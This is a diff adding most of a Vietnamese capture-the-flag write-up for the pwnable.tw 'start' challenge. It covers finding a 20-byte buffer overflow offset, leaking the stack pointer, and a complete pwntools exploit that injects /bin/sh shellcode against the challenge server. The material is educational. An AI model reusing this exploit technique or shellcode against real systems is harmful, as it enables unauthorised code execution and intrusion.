@@ -15,7 +15,7 @@ Tải file binary về và check xem thử nó cho ta những gì.
 
 ![image](https://user-images.githubusercontent.com/90976397/175884807-838589d1-163d-4ad3-b138-c6ece7c57af8.png)
 
-* Một file ELF executable 32-bits và không bị stripped
+* Một file ELF executable 32-bit và không bị stripped
 
 Check xem thử có những mitigation nào
 
@@ -78,12 +78,91 @@ Sau khi chơi pwn được 1 khoảng thời gian thì mỗi lần chạy file b
 ![image](https://user-images.githubusercontent.com/90976397/175905326-136bd64b-02c8-4962-a90c-35653e3c8352.png)
 
 Đúng như mình dự đoán lỗi đầu tiên đó là buffer overflow. Khi thử nhập nhiều chữ a hoặc bất kỳ ký tự nào bạn muốn. Chúng ta có thể confirm bằng việc sau khi nhập một chuỗi dài thì chương trình sẽ bị ngắt quãng và in ra Segmentation fault. 
-
 Khi bạn đã đạt đến level để chơi pwnable.tw thì có lẽ bạn đã biết phần nào về lỗi buffer overflow. Nhưng nếu bạn không biết thì cũng không sao, đã có mình ở đây rồi :D. 
 > Lỗi buffer overflow được định nghĩa là tràn bộ đệm, có nghĩa là khi chương trình đọc input của 1 biến nào đó vượt qua giới hạn của chính nó thì nó sẽ ghi đè xuống bất kể thứ gì ở dưới nó, điều này có thể dẫn tới việc bạn có thể ghi đè hoặc là leak ra thứ gì bạn muốn. Bạn có thể tưởng tượng đơn giản như này, bạn có một chai nước và một con dao, khi bạn lấy đầu con dao đâm một lực vừa đủ thì bạn có thể làm cho nó chảy nước ra ngoài. Btw, để có thể ngăn lỗi này thì cơ chế bảo vệ canary ra đời. 
 
+Để tận dụng được lỗi này chúng ta phải tìm được offset để có thể gây ra lỗi tràn bộ nhớ đệm (Ở một bài khác mình sẽ giải thích rõ cách này). Có khá là nhiều cách để có thể tìm, ở bài này mình dùng cách khá là automatically nhưng mình khuyến khích các bạn nên tìm theo cách lấy offset của eip trừ cho offset của buffer, cách này sẽ giúp các bạn hiểu rõ hơn về lỗi buffer overflow.
+* Đầu tiên mình sẽ tạo 1 chuỗi 50 ký tự 
+![image](https://user-images.githubusercontent.com/90976397/175947712-991b2977-4a5d-4f55-bae5-ced62cc08d65.png)
+
+* Sau đó dùng chuỗi vừa tạo làm input cho chương trình 
+
+![image](https://user-images.githubusercontent.com/90976397/175947881-b4ebc347-0240-48da-9a25-a9008fed812d.png)
+
+![image](https://user-images.githubusercontent.com/90976397/175948822-f3d6337c-ce6e-4791-8fd6-83011be71146.png)
+
+* Có vẻ như offset để có thể fill hết buffer là 20 và sau đó 4 byte tiếp theo là của return address, chúng ta có thể confirm thông qua việc nhập 20 chữ a cộng với 4 chữ b
+
+![image](https://user-images.githubusercontent.com/90976397/175949665-f4b8f8be-9629-4d93-873a-2adcbb577677.png)
+
+Và sau đó lỗi buffer overflow triggered và return address là 0x62626262 (4 chữ b). Thế là chúng ta đã có thể ghi đè return address.
+
+
+
 Còn gì tuyệt vời hơn việc canary ở chương trình này đã tắt đó chính là NX disable :DD 
-> NX là một cơ chế bảo vệ 
+> NX (non executable) là một cơ chế dùng để ngăn chặn attacker inject shellcode execute trực tiếp trên stack bằng việc hạn chế một số ô nhớ cụ thể và thực thi NX bit. Tuy nhiên cơ chế bảo vệ này vẫn có cách để bypass, cách phổ biến nhất đó là return to libc (cách attack này mình sẽ nói sau)
+
+```Tổng kết lại chúng ta có lỗi buffer overflow để tấn công. Cách attack rất là đơn giản, chúng ta chỉ cần truyền shellcode lên stack và execute nó, sau đó chúng ta sẽ có được shell :DD (sound pretty easy LOL :) )```
+
+Vậy làm sao để chúng ta có thể inject shellcode lên stack? 
+* Đầu tiên chúng ta phải có một con trỏ để trỏ đến stack, nhưng địa stack pointer luôn thay đổi ở memory mỗi lần chúng ta chạy chương trình, chúng ta phải tìm 1 cách để có thể có được địa chỉ của stack pointer. Quay lại assembly code và đọc (Mình đã nói đọc assembly code quan trọng mà :)) chúng ta có thể thấy được stack pointer được push vào stack ngay lúc chương trình bắt đầu
+
+![image](https://user-images.githubusercontent.com/90976397/175945499-bfde7bb1-1dfa-411c-9370-fd4f65fe6c3c.png)
+
+Hãy đặt 2 breakpoint, breakpoint thứ nhất tại lúc ngay sau khi stack pointer được push vào stack, cái thứ 2 là tại ret instruction 
+
+![image](https://user-images.githubusercontent.com/90976397/175946278-e850a718-ce85-4b23-a591-3530441bd500.png)
+
+Chúng ta có thể thấy địa chỉ của stack pointer được đẩy lên trên cùng.
+
+![image](https://user-images.githubusercontent.com/90976397/175950678-11b976eb-49cf-4699-896e-4a46758c7df9.png)
+
+> Bây giờ thứ chúng ta đã có là chúng ta có thể control được return address và stack pointer ở trên là thứ chúng ta cần phải leak, chúng ta có thể lợi dụng những gì chương trình có được để có thể leak. Quay lại đọc assembly code :D. Tại offset 0x08048087 chính là để bắt đầu in nội dung ở stack (ở đây chính là stack pointer) ra console. Và 4 byte đầu được in ra chính là stack pointer mà chúng ta cần ở đầu chương trình. Và đó chính là cách mà chúng ta sẽ thực hiện.
+```
+from pwn import *
+r = process('./start')
+payload = b'a'*20 + p32(0x08048087) #20 chữ a là để fill buffer, p32(0x08048087) để ghi đè return address về 0x08048087
+r.sendafter(b':',payload)
+leak = r.recv()[0:4] 
+print(leak)
+esp = u32(leak)
+log.info('esp: '+hex(esp))
+r.interactive()
+```
+![image](https://user-images.githubusercontent.com/90976397/175954741-cdfe281b-e89f-4c78-a4b2-632ce353c320.png)
+
+Và từ đó chúng ta đã có thể leak được địa chỉ của stack pointer
+
+Sau khi có được địa chỉ của stack pointer thì bước cuối cùng đó là chèn shellcode vào stack và execute nó. Nhưng mà có 1 lưu ý nho nhỏ đó là sau khi chúng ta đã leak được stack pointer rồi nhưng mà thực tế stack pointer nó không trỏ chính xác đến stack mà nó trỏ đến 20 byte đằng sau stack, để payload có thể chạy okelah thì chúng ta phải add 20 byte vào sau địa chỉ của stack pointer. 
+Btw, một câu nói mình đã nghe đâu đó, "đừng có lạm dụng những thứ có sẵn quá nhiều, nên code ra để xem thử nó ra sao", nếu bạn là người mới chơi thì nên tự code shellcode để xem nó ra sao thay vì lên shellstorm lấy shellcode có sẵn. 
+Và đây là exploit cuối của mình 
+
+```
+from pwn import * 
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+r = remote("chall.pwnable.tw",10000)
+#r = process('./start')
+payload = b'a'*20 + p32(0x08048087) #20 chữ a là để fill buffer, p32(0x08048087) để ghi đè return address về 0x08048087
+r.sendafter(b':',payload)
+leak = r.recv()[0:4] #
+print(leak)
+esp = u32(leak)
+log.info('esp: '+hex(esp))
+payload = b'a'*20 + p32(esp + 20) + shellcode
+r.send(payload)
+r.interactive()
+```
+
+![image](https://user-images.githubusercontent.com/90976397/175957620-212eb1c9-8313-441e-a2b4-879b6c73913d.png)
+
+Cảm ơn bạn vì đã đọc hết. Nếu như bạn không hiểu gì thì hãy ngồi viết ra và suy ngẫm lại xem mình đang mắc ở đâu và fix nó như nào. 
+
+-y198-
+
+![kientri](https://user-images.githubusercontent.com/90976397/175959023-4e678907-b395-4b52-9cc9-04fd382d8272.png)
+
+
 
 
 
